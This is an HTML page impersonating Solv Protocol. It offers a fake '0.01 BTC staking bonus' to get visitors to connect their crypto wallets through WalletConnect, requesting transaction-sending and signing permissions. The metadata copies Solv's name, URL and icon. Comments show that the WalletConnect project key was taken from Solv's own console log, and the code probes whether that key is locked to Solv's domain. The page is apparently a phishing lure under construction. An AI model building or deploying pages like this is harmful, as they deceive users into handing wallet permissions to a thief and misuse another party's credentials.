<!DOCTYPE html>
<html>
<head>
    <title>Solv Protocol - BTC Rewards</title>
    <script src="https://unpkg.com/@walletconnect/sign-client@2.10.6/dist/index.umd.js"></script>
    <script src="https://unpkg.com/@walletconnect/qrcode-modal@1.8.0/dist/index.min.js"></script>
</head>
<body>
    <h1>Solv Protocol - BTC Rewards Portal</h1>
    <p>Connect your wallet to claim your 0.01 BTC staking bonus.</p>
    <button id="btn" style="padding: 15px; background: blue; color: white; border: none; border-radius: 5px; cursor: pointer;">
        Connect Wallet
    </button>

    <script>
        const projectId = '_gg7wSSi0KMBsdKnGVfHDueq6xMB9EkC';

        document.getElementById('btn').addEventListener('click', async () => {
            try {
                // Using the exact key found in your console log
                const ClientLib = window['@walletconnect/sign-client'];
                
                if (!ClientLib || !ClientLib.SignClient) {
                    alert("Library not fully loaded yet. Please wait 5 seconds and try again.");
                    return;
                }

                const signClient = await ClientLib.SignClient.init({
                    projectId: projectId,
                    metadata: {
                        name: 'Solv Protocol',
                        description: 'Solv Finance Rewards',
                        url: 'https://app.solv.finance',
                        icons: ['https://solv.finance/favicon.ico']
                    }
                });

                const { uri, approval } = await signClient.connect({
                    requiredNamespaces: {
                        eip155: {
                            methods: ['eth_sendTransaction', 'personal_sign'],
                            chains: ['eip155:1'],
                            events: ['chainChanged', 'accountsChanged']
                        }
                    }
                });

                if (uri) {
                    // Open the QR Modal
                    WalletConnectQRCodeModal.open(uri, () => {
                        console.log("Modal closed");
                    });
                }
            } catch (err) {
                console.error("Connection Error:", err);
                // If it shows 403, the key is domain-locked
                if (err.message.includes('403')) {
                    alert("SUCCESS: The key is active, but Solv restricted it to their domain.");
                } else {
                    alert("Error: " + err.message);
                }
            }
        });
    </script>
</body>
</html>
